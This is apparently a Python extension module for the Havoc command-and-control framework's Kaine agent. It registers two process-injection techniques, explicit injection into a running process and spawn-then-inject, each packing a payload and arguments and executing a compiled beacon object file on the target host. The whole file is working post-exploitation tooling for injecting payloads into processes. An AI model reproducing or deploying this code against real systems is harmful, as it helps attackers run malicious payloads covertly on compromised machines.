from pyhavoc.agent import *
from os.path       import *

@KnRegisterInjectExplicit( 'Basic', 'Description of basic injection technique (this one will just use the default injection technique from the agent)' )
def inject_explicit_basic( **kwargs ) -> HcKaineTask:
    agent         = kwargs[ 'agent' ]
    process       = kwargs[ 'process' ]
    payload       = kwargs[ 'payload' ]
    argument      = kwargs[ 'argument' ]
    offset        = kwargs[ 'offset' ]
    arch          = kwargs[ 'arch' ]
    single_memory = kwargs[ 'single_memory' ]
    track_memory  = kwargs[ 'track_memory' ]
    ignore_token  = kwargs[ 'ignore_token' ]
    task_wait     = kwargs[ 'task_wait' ]

    return agent.object_execute(
        f"{dirname( __file__ )}/bin/inject-explicit.{agent.agent_meta()['arch']}.obj",
        'go' + arch,
        object_argv = bof_pack( 'iibb', process, offset, payload, argument ),

        task_wait = task_wait
    )

@KnRegisterInjectSpawn( 'Basic', 'Description of basic injection technique (this one will just use the default injection technique from the agent)' )
def inject_spawn_basic( **kwargs ) -> HcKaineTask:
    agent         = kwargs[ 'agent' ]
    process       = kwargs[ 'process' ]
    payload       = kwargs[ 'payload' ]
    argument      = kwargs[ 'argument' ]
    offset        = kwargs[ 'offset' ]
    arch          = kwargs[ 'arch' ]
    single_memory = kwargs[ 'single_memory' ]
    ignore_token  = kwargs[ 'ignore_token' ]
    task_wait     = kwargs[ 'task_wait' ]

    return agent.object_execute(
        f"{dirname( __file__ )}/bin/inject-spawn.{agent.agent_meta()['arch']}.obj",
        'go' + arch,
        object_argv = bof_pack( 'sibb', ignore_token, offset, payload, argument ),

        task_wait = task_wait
    )
